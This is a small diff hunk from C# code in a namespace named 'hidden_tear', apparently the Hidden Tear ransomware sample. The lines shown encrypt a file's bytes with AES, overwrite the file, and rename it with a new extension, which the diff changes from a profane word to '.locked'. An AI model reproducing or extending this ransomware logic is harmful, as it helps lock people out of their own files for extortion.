@@ -145,7 +145,7 @@ namespace hidden_tear
             byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);
 
             File.WriteAllBytes(file, bytesEncrypted);
-            System.IO.File.Move(file, file+".fucked");
+            System.IO.File.Move(file, file+".locked");
 
             
             
